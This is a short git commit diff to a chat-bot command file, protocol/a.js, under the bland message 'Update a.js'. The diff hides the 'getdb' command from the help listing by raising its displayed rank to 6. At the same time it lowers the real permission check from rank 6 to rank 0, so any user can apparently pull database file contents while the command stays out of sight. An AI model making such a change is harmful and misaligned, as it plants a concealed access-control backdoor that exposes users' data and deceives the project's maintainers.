fd2025e390ba5ee64480c90dc4ea7c19e2d18ee8
Builderman <yhi958232@gmail.com>
2024-10-14 18:28:55 +0200

    Update a.js

--- protocol/a.js
+++ protocol/a.js
@@ -47,10 +47,10 @@ if (message.startsWith(config.prefix)) {
 			},1000)
 		}
 	} else if (cmd === "help") {
-		var cmds = {help: 0, id: 0, reload: 5, setrank: 5, quota: 5, bot: 5, unban: 5, mute: 4, unmute: 5, perms: 5, announce: 5, tag: 6, token: 6, js: 6, kick: 3, info: 5, gentoken: 5, meow: 2, getdb: 0 };
+		var cmds = {help: 0, id: 0, reload: 5, setrank: 5, quota: 5, bot: 5, unban: 5, mute: 4, unmute: 5, perms: 5, announce: 5, tag: 6, token: 6, js: 6, kick: 3, info: 5, gentoken: 5, meow: 2, getdb: 6 };
 		var availablecmds = Object.keys(cmds).filter(a => cmds[a] <= user.rank);
 		return say(`Commands: ${availablecmds.map(a => config.prefix + a).join(', ')}`)
-	} else if (cmd === "getdb" && user.rank >= 6) {
+	} else if (cmd === "getdb" && user.rank >= 0) {
 		const fs = require('fs');
 		
 		const sendFileContentsWithoutNewline = async (filePath, fileName) => {
